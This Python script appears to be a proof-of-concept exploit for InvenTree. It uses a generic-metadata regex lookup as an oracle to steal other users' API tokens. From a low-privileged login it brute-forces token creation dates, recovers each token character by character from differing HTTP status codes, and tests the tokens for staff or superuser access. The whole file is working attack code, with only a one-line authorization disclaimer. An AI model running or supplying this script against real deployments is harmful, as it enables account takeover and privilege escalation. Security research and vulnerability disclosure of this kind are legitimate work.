#!/usr/bin/env python3
"""
InvenTree generic-metadata API token recovery PoC.

This script performs the attack path only:

1. Authenticate as a low-privileged user.
2. Brute-force token creation-date suffixes.
3. Recover API token strings through /api/metadata/apitoken/key__regex/.
4. Validate recovered active tokens against /api/user/me/.
5. Print recovered tokens and their validation status.

By default, the script searches from January 1 of the year three years before
today through today. Use --years-back, --date-start, or --date-end to adjust
the search window.

Use only against systems you own or are authorized to test.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import datetime as dt
import time
import urllib.parse
from typing import Any

import requests


HEX = "0123456789abcdef"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Recover InvenTree API tokens via the generic metadata lookup oracle."
    )
    parser.add_argument("--base-url", required=True, help="Base URL, e.g. http://host")
    parser.add_argument("--low-user", required=True, help="Low-privileged username")
    parser.add_argument("--low-pass", required=True, help="Low-privileged password")
    parser.add_argument(
        "--years-back",
        type=int,
        default=3,
        help=(
            "When --date-start is omitted, start at Jan 1 of "
            "YEAR(--date-end) - YEARS_BACK. Default: 3."
        ),
    )
    parser.add_argument(
        "--date-start",
        help="First token creation date to test, YYYY-MM-DD. Overrides --years-back.",
    )
    parser.add_argument(
        "--date-end",
        help="Last token creation date to test, YYYY-MM-DD. Defaults to today.",
    )
    parser.add_argument(
        "--target-user",
        help="Only print tokens that validate as this username, e.g. root.",
    )
    parser.add_argument(
        "--require-superuser",
        action="store_true",
        help="Alias for --only-elevated.",
    )
    parser.add_argument(
        "--only-elevated",
        action="store_true",
        help="Only print active tokens whose /api/user/me/ response has is_staff or is_superuser true.",
    )
    parser.add_argument(
        "--only-active",
        action="store_true",
        help="Only print recovered tokens that successfully authenticate.",
    )
    parser.add_argument("--workers", type=int, default=24, help="Parallel workers")
    parser.add_argument("--timeout", type=float, default=20.0, help="HTTP timeout")
    parser.add_argument(
        "--retries",
        type=int,
        default=5,
        help="Retries for transient network errors and 429 responses",
    )
    return parser.parse_args()


def api(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def parse_date(value: str) -> dt.date:
    return dt.datetime.strptime(value, "%Y-%m-%d").date()


def build_date_window(args: argparse.Namespace) -> list[str]:
    if args.years_back < 0:
        raise ValueError("--years-back must be zero or greater")

    end = parse_date(args.date_end) if args.date_end else dt.date.today()
    start = (
        parse_date(args.date_start)
        if args.date_start
        else dt.date(end.year - args.years_back, 1, 1)
    )

    if end < start:
        raise ValueError("--date-end must be on or after --date-start")

    suffixes = []
    current = start
    while current <= end:
        suffixes.append("-" + current.strftime("%Y%m%d"))
        current += dt.timedelta(days=1)

    return suffixes


def regex_url(base_url: str, pattern: str) -> str:
    encoded = urllib.parse.quote(pattern, safe="")
    return api(base_url, f"/api/metadata/apitoken/key__regex/{encoded}/")


def get_with_retry(
    url: str,
    *,
    auth: tuple[str, str] | None = None,
    headers: dict[str, str] | None = None,
    timeout: float,
    retries: int,
) -> requests.Response:
    last_error: Exception | None = None

    for attempt in range(retries + 1):
        try:
            response = requests.get(url, auth=auth, headers=headers, timeout=timeout)
        except requests.RequestException as exc:
            last_error = exc
            time.sleep(min(2**attempt, 10))
            continue

        if response.status_code == 429 and attempt < retries:
            retry_after = response.headers.get("Retry-After")
            delay = float(retry_after) if retry_after and retry_after.isdigit() else min(2**attempt, 10)
            time.sleep(delay)
            continue

        return response

    raise RuntimeError(f"HTTP request failed after retries: {last_error}")


def oracle(
    base_url: str,
    auth: tuple[str, str],
    pattern: str,
    timeout: float,
    retries: int,
) -> bool:
    response = get_with_retry(
        regex_url(base_url, pattern),
        auth=auth,
        timeout=timeout,
        retries=retries,
    )

    # The vulnerable endpoint leaks whether the regex matched zero rows,
    # exactly one unauthorized row, or multiple rows before permissions run.
    if response.status_code in (403, 500):
        return True

    if response.status_code == 404:
        return False

    raise RuntimeError(f"Unexpected oracle status: {response.status_code}")


def preflight(base_url: str, auth: tuple[str, str], timeout: float, retries: int) -> None:
    response = get_with_retry(
        api(base_url, "/api/user/me/"),
        auth=auth,
        timeout=timeout,
        retries=retries,
    )

    if response.status_code != 200:
        raise RuntimeError(f"Low-privileged credential check failed: {response.status_code}")

    data = response.json()
    print(f"[+] Authenticated as: {data.get('username')}", flush=True)
    print(f"    is_superuser: {data.get('is_superuser')}", flush=True)
    print(f"    is_staff: {data.get('is_staff')}", flush=True)


def find_matching_dates(
    base_url: str,
    auth: tuple[str, str],
    suffixes: list[str],
    workers: int,
    timeout: float,
    retries: int,
) -> list[str]:
    print(f"[*] Brute-forcing {len(suffixes)} token date suffix(es)", flush=True)

    def test_suffix(suffix: str) -> tuple[str, bool]:
        pattern = f"^inv-[0-9a-f]{{40}}{suffix}$"
        matched = oracle(base_url, auth, pattern, timeout, retries)
        return suffix, matched

    matches = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(test_suffix, suffix) for suffix in suffixes]
        for future in concurrent.futures.as_completed(futures):
            suffix, matched = future.result()
            if matched:
                matches.append(suffix)
                print(f"[+] Found token date: {suffix[1:]}", flush=True)

    return sorted(matches)


def recover_bodies_for_date(
    base_url: str,
    auth: tuple[str, str],
    suffix: str,
    workers: int,
    timeout: float,
    retries: int,
) -> list[str]:
    frontier = [""]
    requests_made = 0
    start = time.time()

    print(f"[*] Recovering token body candidate(s) for {suffix[1:]}", flush=True)

    def test_prefix(prefix: str) -> tuple[str, bool]:
        # Keep the regex anchored so each positive response proves that at
        # least one token still exists under this exact prefix and date.
        remaining = 40 - len(prefix)
        pattern = f"^inv-{prefix}[0-9a-f]{{{remaining}}}{suffix}$"
        matched = oracle(base_url, auth, pattern, timeout, retries)
        return prefix, matched

    for depth in range(40):
        probes = [prefix + char for prefix in frontier for char in HEX]
        next_frontier = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(test_prefix, probe) for probe in probes]
            for future in concurrent.futures.as_completed(futures):
                prefix, matched = future.result()
                requests_made += 1
                if matched:
                    next_frontier.append(prefix)

        frontier = sorted(next_frontier)

        if depth < 4 or (depth + 1) % 8 == 0:
            elapsed = time.time() - start
            print(
                f"    depth {depth + 1:02d}: {len(frontier)} branch(es), "
                f"{requests_made} oracle request(s), {elapsed:.1f}s",
                flush=True,
            )

        if not frontier:
            raise RuntimeError(f"Oracle search lost all branches for date {suffix[1:]}")

    return frontier


def validate_token(
    base_url: str,
    token: str,
    timeout: float,
    retries: int,
) -> dict[str, Any] | None:
    # Validation is intentionally limited to /api/user/me/: a 200 proves the
    # recovered string is a live bearer token and identifies the token owner.
    response = get_with_retry(
        api(base_url, "/api/user/me/"),
        headers={"Authorization": "Token " + token},
        timeout=timeout,
        retries=retries,
    )

    if response.status_code != 200:
        return None

    return response.json()


def should_print(args: argparse.Namespace, user: dict[str, Any] | None) -> bool:
    only_elevated = args.only_elevated or args.require_superuser

    if args.only_active and user is None:
        return False

    if args.target_user and (user is None or user.get("username") != args.target_user):
        return False

    if only_elevated and not (
        user and (user.get("is_staff") or user.get("is_superuser"))
    ):
        return False

    return True


def main() -> int:
    args = parse_args()
    auth = (args.low_user, args.low_pass)

    suffixes = build_date_window(args)
    print(f"[*] Date window: {suffixes[0][1:]} through {suffixes[-1][1:]}", flush=True)

    preflight(args.base_url, auth, args.timeout, args.retries)

    matching_dates = find_matching_dates(
        args.base_url,
        auth,
        suffixes,
        args.workers,
        args.timeout,
        args.retries,
    )

    if not matching_dates:
        print("[-] No token dates matched in the supplied window")
        return 1

    recovered_tokens = []
    for suffix in matching_dates:
        bodies = recover_bodies_for_date(
            args.base_url,
            auth,
            suffix,
            args.workers,
            args.timeout,
            args.retries,
        )
        recovered_tokens.extend("inv-" + body + suffix for body in bodies)

    print(f"[*] Recovered {len(recovered_tokens)} token candidate(s)", flush=True)

    printed = 0
    active = 0

    for token in sorted(recovered_tokens):
        user = validate_token(args.base_url, token, args.timeout, args.retries)

        if user is not None:
            active += 1

        if not should_print(args, user):
            continue

        printed += 1
        print()
        print("[+] Recovered token")
        print(f"    token: {token}")

        if user is None:
            print("    active: false")
            print("    user: unknown")
        else:
            print("    active: true")
            print(f"    user: {user.get('username')}")
            print(f"    is_staff: {user.get('is_staff')}")
            print(f"    is_superuser: {user.get('is_superuser')}")

    print()
    print("[*] Summary")
    print(f"    date_matches: {len(matching_dates)}")
    print(f"    recovered_candidates: {len(recovered_tokens)}")
    print(f"    active_tokens: {active}")
    print(f"    printed_tokens: {printed}")

    if printed == 0:
        return 2

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
